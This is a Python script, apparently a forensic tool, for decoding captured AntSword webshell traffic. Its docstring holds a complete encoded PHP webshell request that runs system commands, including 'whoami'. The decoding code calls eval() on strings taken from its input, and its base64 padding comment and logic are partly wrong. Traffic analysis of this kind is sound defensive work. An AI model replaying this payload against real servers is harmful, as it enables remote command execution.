#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# Author : N0Coriander
# address : https://github.com/N0Coriander
# Date : 2021/6/23 08:48
# Desc : 蚁剑连接php后门时，数据流量会通过ascii编码，同时会将执行的命令使用base64加密，针对以上两种现象进行流量还原
# Compare : 新增base64解密

"""
Request body example:
1=%40eVAl%28cHr%2864%29.ChR%28105%29.ChR%28110%29.ChR%28105%29.ChR%2895%29.ChR%28115%29.ChR%28101%29.ChR%28116%29.ChR%2840%29.ChR%2834%29.ChR%28100%29.ChR%28105%29.ChR%28115%29.ChR%28112%29.ChR%28108%29.ChR%2897%29.ChR%28121%29.ChR%2895%29.ChR%28101%29.ChR%28114%29.ChR%28114%29.ChR%28111%29.ChR%28114%29.ChR%28115%29.ChR%2834%29.ChR%2844%29.ChR%2832%29.ChR%2834%29.ChR%2848%29.ChR%2834%29.ChR%2841%29.ChR%2859%29.ChR%2864%29.ChR%28115%29.ChR%28101%29.ChR%28116%29.ChR%2895%29.ChR%28116%29.ChR%28105%29.ChR%28109%29.ChR%28101%29.ChR%2895%29.ChR%28108%29.ChR%28105%29.ChR%28109%29.ChR%28105%29.ChR%28116%29.ChR%2840%29.ChR%2848%29.ChR%2841%29.ChR%2859%29.ChR%28101%29.ChR%2899%29.ChR%28104%29.ChR%28111%29.ChR%2832%29.ChR%2834%29.ChR%2848%29.ChR%2849%29.ChR%2854%29.ChR%2899%29.ChR%2857%29.ChR%2834%29.ChR%2859%29.ChR%2836%29.ChR%28112%29.ChR%2861%29.ChR%2898%29.ChR%2897%29.ChR%28115%29.ChR%28101%29.ChR%2854%29.ChR%2852%29.ChR%2895%29.ChR%28100%29.ChR%28101%29.ChR%2899%29.ChR%28111%29.ChR%28100%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%2895%29.ChR%2880%29.ChR%2879%29.ChR%2883%29.ChR%2884%29.ChR%2891%29.ChR%2834%29.ChR%2848%29.ChR%28120%29.ChR%2857%29.ChR%2857%29.ChR%28101%29.ChR%2898%29.ChR%28102%29.ChR%2855%29.ChR%2853%29.ChR%28102%29.ChR%28100%29.ChR%2852%29.ChR%2854%29.ChR%2857%29.ChR%2853%29.ChR%2834%29.ChR%2893%29.ChR%2841%29.ChR%2859%29.ChR%2836%29.ChR%28115%29.ChR%2861%29.ChR%2898%29.ChR%2897%29.ChR%28115%29.ChR%28101%29.ChR%2854%29.ChR%2852%29.ChR%2895%29.ChR%28100%29.ChR%28101%29.ChR%2899%29.ChR%28111%29.ChR%28100%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%2895%29.ChR%2880%29.ChR%2879%29.ChR%2883%29.ChR%2884%29.ChR%2891%29.ChR%2834%29.ChR%2848%29.ChR%28120%29.ChR%2897%29.ChR%2848%29.ChR%2848%29.ChR%2853%29.ChR%2850%29.ChR%2850%29.ChR%2856%29.ChR%2855%29.ChR%2857%29.ChR%2848%29.ChR%2852%29.ChR%2848%29.ChR%2857%29.ChR%2834%29.ChR%2893%29.ChR%2841%29.ChR%2859%29.ChR%2836%29.ChR%28100%29.ChR%2861%29.ChR%28100%29.ChR%28105%29.ChR%28114%29.ChR%28110%29.ChR%2897%29.ChR%28109%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%2895%29.ChR%2883%29.ChR%2869%29.ChR%2882%29.ChR%2886%29.ChR%2869%29.ChR%2882%29.ChR%2891%29.ChR%2834%29.ChR%2883%29.ChR%2867%29.ChR%2882%29.ChR%2873%29.ChR%2880%29.ChR%2884%29.ChR%2895%29.ChR%2870%29.ChR%2873%29.ChR%2876%29.ChR%2869%29.ChR%2878%29.ChR%2865%29.ChR%2877%29.ChR%2869%29.ChR%2834%29.ChR%2893%29.ChR%2841%29.ChR%2859%29.ChR%2836%29.ChR%2899%29.ChR%2861%29.ChR%28115%29.ChR%28117%29.ChR%2898%29.ChR%28115%29.ChR%28116%29.ChR%28114%29.ChR%2840%29.ChR%2836%29.ChR%28100%29.ChR%2844%29.ChR%2848%29.ChR%2844%29.ChR%2849%29.ChR%2841%29.ChR%2861%29.ChR%2861%29.ChR%2834%29.ChR%2847%29.ChR%2834%29.ChR%2863%29.ChR%2834%29.ChR%2845%29.ChR%2899%29.ChR%2832%29.ChR%2892%29.ChR%2834%29.ChR%28123%29.ChR%2836%29.ChR%28115%29.ChR%28125%29.ChR%2892%29.ChR%2834%29.ChR%2834%29.ChR%2858%29.ChR%2834%29.ChR%2847%29.ChR%2899%29.ChR%2832%29.ChR%2892%29.ChR%2834%29.ChR%28123%29.ChR%2836%29.ChR%28115%29.ChR%28125%29.ChR%2892%29.ChR%2834%29.ChR%2834%29.ChR%2859%29.ChR%2836%29.ChR%28114%29.ChR%2861%29.ChR%2834%29.ChR%28123%29.ChR%2836%29.ChR%28112%29.ChR%28125%29.ChR%2832%29.ChR%28123%29.ChR%2836%29.ChR%2899%29.ChR%28125%29.ChR%2834%29.ChR%2859%29.ChR%28102%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28116%29.ChR%28105%29.ChR%28111%29.ChR%28110%29.ChR%2832%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%2841%29.ChR%28123%29.ChR%2836%29.ChR%28100%29.ChR%2861%29.ChR%28101%29.ChR%28120%29.ChR%28112%29.ChR%28108%29.ChR%28111%29.ChR%28100%29.ChR%28101%29.ChR%2840%29.ChR%2834%29.ChR%2844%29.ChR%2834%29.ChR%2844%29.ChR%2864%29.ChR%28105%29.ChR%28110%29.ChR%28105%29.ChR%2895%29.ChR%28103%29.ChR%28101%29.ChR%28116%29.ChR%2840%29.ChR%2834%29.ChR%28100%29.ChR%28105%29.ChR%28115%29.ChR%2897%29.ChR%2898%29.ChR%28108%29.ChR%28101%29.ChR%2895%29.ChR%28102%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28116%29.ChR%28105%29.ChR%28111%29.ChR%28110%29.ChR%28115%29.ChR%2834%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28105%29.ChR%28102%29.ChR%2840%29.ChR%28101%29.ChR%28109%29.ChR%28112%29.ChR%28116%29.ChR%28121%29.ChR%2840%29.ChR%2836%29.ChR%28100%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%2836%29.ChR%28100%29.ChR%2861%29.ChR%2897%29.ChR%28114%29.ChR%28114%29.ChR%2897%29.ChR%28121%29.ChR%2840%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28123%29.ChR%2836%29.ChR%28100%29.ChR%2861%29.ChR%2897%29.ChR%28114%29.ChR%28114%29.ChR%2897%29.ChR%28121%29.ChR%2895%29.ChR%28109%29.ChR%2897%29.ChR%28112%29.ChR%2840%29.ChR%2839%29.ChR%28116%29.ChR%28114%29.ChR%28105%29.ChR%28109%29.ChR%2839%29.ChR%2844%29.ChR%2897%29.ChR%28114%29.ChR%28114%29.ChR%2897%29.ChR%28121%29.ChR%2895%29.ChR%28109%29.ChR%2897%29.ChR%28112%29.ChR%2840%29.ChR%2839%29.ChR%28115%29.ChR%28116%29.ChR%28114%29.ChR%28116%29.ChR%28111%29.ChR%28108%29.ChR%28111%29.ChR%28119%29.ChR%28101%29.ChR%28114%29.ChR%2839%29.ChR%2844%29.ChR%2836%29.ChR%28100%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%28117%29.ChR%28114%29.ChR%28110%29.ChR%2840%29.ChR%28102%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28116%29.ChR%28105%29.ChR%28111%29.ChR%28110%29.ChR%2895%29.ChR%28101%29.ChR%28120%29.ChR%28105%29.ChR%28115%29.ChR%28116%29.ChR%28115%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%2841%29.ChR%2838%29.ChR%2838%29.ChR%28105%29.ChR%28115%29.ChR%2895%29.ChR%2899%29.ChR%2897%29.ChR%28108%29.ChR%28108%29.ChR%2897%29.ChR%2898%29.ChR%28108%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%2841%29.ChR%2838%29.ChR%2838%29.ChR%2833%29.ChR%28105%29.ChR%28110%29.ChR%2895%29.ChR%2897%29.ChR%28114%29.ChR%28114%29.ChR%2897%29.ChR%28121%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%2844%29.ChR%2836%29.ChR%28100%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%2859%29.ChR%28102%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28116%29.ChR%28105%29.ChR%28111%29.ChR%28110%29.ChR%2832%29.ChR%28114%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28109%29.ChR%28100%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2841%29.ChR%28123%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2861%29.ChR%2848%29.ChR%2859%29.ChR%28105%29.ChR%28102%29.ChR%2840%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2839%29.ChR%28115%29.ChR%28121%29.ChR%28115%29.ChR%28116%29.ChR%28101%29.ChR%28109%29.ChR%2839%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%2864%29.ChR%28115%29.ChR%28121%29.ChR%28115%29.ChR%28116%29.ChR%28101%29.ChR%28109%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2844%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28105%29.ChR%28102%29.ChR%2840%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2839%29.ChR%28112%29.ChR%2897%29.ChR%28115%29.ChR%28115%29.ChR%28116%29.ChR%28104%29.ChR%28114%29.ChR%28117%29.ChR%2839%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%2864%29.ChR%28112%29.ChR%2897%29.ChR%28115%29.ChR%28115%29.ChR%28116%29.ChR%28104%29.ChR%28114%29.ChR%28117%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2844%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28105%29.ChR%28102%29.ChR%2840%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2839%29.ChR%28115%29.ChR%28104%29.ChR%28101%29.ChR%28108%29.ChR%28108%29.ChR%2895%29.ChR%28101%29.ChR%28120%29.ChR%28101%29.ChR%2899%29.ChR%2839%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%28112%29.ChR%28114%29.ChR%28105%29.ChR%28110%29.ChR%28116%29.ChR%2840%29.ChR%2864%29.ChR%28115%29.ChR%28104%29.ChR%28101%29.ChR%28108%29.ChR%28108%29.ChR%2895%29.ChR%28101%29.ChR%28120%29.ChR%28101%29.ChR%2899%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28105%29.ChR%28102%29.ChR%2840%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2839%29.ChR%28101%29.ChR%28120%29.ChR%28101%29.ChR%2899%29.ChR%2839%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%2864%29.ChR%28101%29.ChR%28120%29.ChR%28101%29.ChR%2899%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2844%29.ChR%2836%29.ChR%28111%29.ChR%2844%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2841%29.ChR%2859%29.ChR%28112%29.ChR%28114%29.ChR%28105%29.ChR%28110%29.ChR%28116%29.ChR%2840%29.ChR%28106%29.ChR%28111%29.ChR%28105%29.ChR%28110%29.ChR%2840%29.ChR%2834%29.ChR%2810%29.ChR%2834%29.ChR%2844%29.ChR%2836%29.ChR%28111%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28105%29.ChR%28102%29.ChR%2832%29.ChR%2840%29.ChR%28102%29.ChR%28101%29.ChR%2840%29.ChR%2839%29.ChR%28112%29.ChR%28111%29.ChR%28112%29.ChR%28101%29.ChR%28110%29.ChR%2839%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%2836%29.ChR%28102%29.ChR%28112%29.ChR%2861%29.ChR%2864%29.ChR%28112%29.ChR%28111%29.ChR%28112%29.ChR%28101%29.ChR%28110%29.ChR%2840%29.ChR%2836%29.ChR%2899%29.ChR%2844%29.ChR%2839%29.ChR%28114%29.ChR%2839%29.ChR%2841%29.ChR%2859%29.ChR%28119%29.ChR%28104%29.ChR%28105%29.ChR%28108%29.ChR%28101%29.ChR%2840%29.ChR%2833%29.ChR%2864%29.ChR%28102%29.ChR%28101%29.ChR%28111%29.ChR%28102%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%28112%29.ChR%2841%29.ChR%2841%29.ChR%28123%29.ChR%28112%29.ChR%28114%29.ChR%28105%29.ChR%28110%29.ChR%28116%29.ChR%2840%29.ChR%2864%29.ChR%28102%29.ChR%28103%29.ChR%28101%29.ChR%28116%29.ChR%28115%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%28112%29.ChR%2844%29.ChR%2832%29.ChR%2850%29.ChR%2848%29.ChR%2852%29.ChR%2856%29.ChR%2841%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%2864%29.ChR%28112%29.ChR%2899%29.ChR%28108%29.ChR%28111%29.ChR%28115%29.ChR%28101%29.ChR%2840%29.ChR%2836%29.ChR%28102%29.ChR%28112%29.ChR%2841%29.ChR%2859%29.ChR%28125%29.ChR%28101%29.ChR%28108%29.ChR%28115%29.ChR%28101%29.ChR%28123%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2832%29.ChR%2861%29.ChR%2832%29.ChR%2849%29.ChR%2850%29.ChR%2855%29.ChR%2859%29.ChR%28125%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%28117%29.ChR%28114%29.ChR%28110%29.ChR%2832%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2859%29.ChR%28125%29.ChR%2859%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2861%29.ChR%2864%29.ChR%28114%29.ChR%28117%29.ChR%28110%29.ChR%2899%29.ChR%28109%29.ChR%28100%29.ChR%2840%29.ChR%2836%29.ChR%28114%29.ChR%2846%29.ChR%2834%29.ChR%2832%29.ChR%2850%29.ChR%2862%29.ChR%2838%29.ChR%2849%29.ChR%2834%29.ChR%2841%29.ChR%2859%29.ChR%28112%29.ChR%28114%29.ChR%28105%29.ChR%28110%29.ChR%28116%29.ChR%2832%29.ChR%2840%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2833%29.ChR%2861%29.ChR%2848%29.ChR%2841%29.ChR%2863%29.ChR%2834%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%2861%29.ChR%28123%29.ChR%2836%29.ChR%28114%29.ChR%28101%29.ChR%28116%29.ChR%28125%29.ChR%2834%29.ChR%2858%29.ChR%2834%29.ChR%2834%29.ChR%2859%29.ChR%2859%29.ChR%28101%29.ChR%2899%29.ChR%28104%29.ChR%28111%29.ChR%2832%29.ChR%2834%29.ChR%2857%29.ChR%2849%29.ChR%2853%29.ChR%2855%29.ChR%2851%29.ChR%2834%29.ChR%2859%29.ChR%28100%29.ChR%28105%29.ChR%28101%29.ChR%2840%29.ChR%2841%29.ChR%2859%29%29%3B&0x99ebf75fd4695=Y21k&0xa005228790409=Y2QgL2QgIkM6XFxwaHBTdHVkeVxcUEhQVHV0b3JpYWxcXFdXVyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd
"""
import base64
from urllib import parse
import re

# 获取用户输入
user_input = input('[+] 请输入蚁剑连接php后门时的流量数据：')
user_input = user_input.strip()     # 去空
data_url_decode = parse.unquote(user_input)  # 整体url解码
data_lower = data_url_decode.lower()  # 字符串中的大写字母全都转换为小写，以便能够直接使用原始数据中的chr函数
# 查找所有的chr字符串
find_chr_expression = re.compile(r'((chr\(\d+\)\.)+(chr\(\d+\)))')
find_chr_expression_result = find_chr_expression.findall(data_lower)
end_data_list = find_chr_expression_result[0][0].split('.')
# 使用eval将chr()字符串变成函数
for n in range(0, len(end_data_list)):
    new = eval(end_data_list[n])
    end_data_list[n] = new
# 将解码后的数据替换回到原始字符串中
end_data = re.sub(r'((chr\(\d+\)\.)+(chr\(\d+\)))', (''.join(end_data_list)), data_lower)

# 考虑到是否为完整流量包，如果只是来自天眼的数据，末尾是没有 &0x 开头的参数的
if '&0x' not in end_data:
    print(end_data)
else:
    # 定位&0x开头的参数，参数值为base64加密数据
    find_0x_expression = re.compile(r'(&0x(\w+)=(.+))')
    find_0x_expression_result = find_0x_expression.findall(data_url_decode)
    # 以&0x做分割
    final_data_list = find_0x_expression_result[0][0].split('&0x')
    # 去掉列表中的空元素
    if '' in final_data_list:
        final_data_list.remove('')
    else:
        pass
    # 只获取&0x参数的值，也就是base64加密的数据valid_bs，然后解码，valid_info为解码后的数据
    temp_list = []
    for bs in final_data_list:
        index_number = bs.index('=')    # 获取=的索引号
        valid_bs = bs[index_number + 1:]    # 取到了base64加密的数据
        # 补足base64长度便于后续解码
        missing_padding = 4 - len(valid_bs) % 4     # base64的长度得是8的倍数
        if missing_padding:
            valid_bs += '=' * missing_padding
        valid_info = base64.b64decode(valid_bs.encode('utf-8'))  # 获得解码后的值
        # 将解码后的内容替换参数的值
        temp_list.append('&0x' + bs.replace(bs[index_number + 1:], str(valid_info, 'utf-8')))
    # 部分系统在append之后会，莫名其妙多一个空列表元素，这里给他去掉
    for q in temp_list:
        if q == ['']:
            temp_list.remove([''])
        else:
            pass
    # 将我们base64解码好的值替换原始数据中解码前的值
    end_data_2 = re.sub(r'(&0x(\w+)=(.+))', (''.join(temp_list)), end_data)
    print(end_data_2)
